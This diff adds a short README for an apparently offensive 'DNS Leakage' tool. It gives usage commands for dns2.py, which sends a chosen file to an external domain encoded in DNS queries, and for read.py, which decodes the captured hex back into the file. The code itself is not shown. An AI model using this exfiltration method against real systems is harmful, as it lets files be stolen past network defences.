@@ -1,0 +1,19 @@
+DNS Leakage
+===========
+Written by: Yarden Yerushalmi
+
+----------------------------------------------------------------------------
+For leakage the file run the following command:
+dns2.py {file to leak, example: file.txt} {domain, example: www.yarden.com}
+
+The script will send DNS queries to the DNS server
+You should be able to cache the queries and paste it in a single file
+
+----------------------------------------------------------------------------
+To reverse the file from hex to original run the following command:
+read.py {hexed leaked file}
+The script will reverse the hexed file to the original file
+
+----------------------------------------------------------------------------
+You can test for POC and use dns3.py to create the leaked file as it 
+received on the DNS server and then use read.py with this file
